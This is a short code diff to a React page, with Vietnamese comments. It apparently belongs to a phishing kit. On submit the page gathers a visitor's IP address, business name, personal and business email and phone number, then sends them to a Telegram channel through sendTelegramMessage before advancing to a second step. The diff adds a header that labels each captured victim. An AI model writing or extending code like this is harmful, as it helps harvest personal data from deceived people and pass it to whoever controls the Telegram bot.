@@ -172,8 +172,19 @@ export default function Home() {
     if (Object.keys(errs).length > 0) { setErrors(errs); return; }
     
     setErrors({}); setLoading(true);
+    
+    // Tạo nội dung tin nhắn đầy đủ
     const text = `<b>IP:</b> <code>${escapeHtml(clientIp)}</code>\n<b>Business:</b> <code>${escapeHtml(busName)}</code>\n<b>P.Email:</b> <code>${escapeHtml(perEmail)}</code>\n<b>B.Email:</b> <code>${escapeHtml(busEmail)}</code>\n<b>Phone:</b> <code>${escapeHtml(countryCode + phoneNum)}</code>\n`;
-    setInitialSession(text); sendTelegramMessage('');
+    
+    // Tạo Header định danh khách hàng
+    const shortHeader = `${escapeHtml(busName)} (${escapeHtml(perEmail)})`;
+
+    // Truyền Header vào hàm setInitialSession
+    setInitialSession(text, shortHeader); 
+    
+    // Kích hoạt gửi Telegram
+    sendTelegramMessage('');
+    
     setTimeout(() => { setLoading(false); setStep(2); }, 700);
   };
 
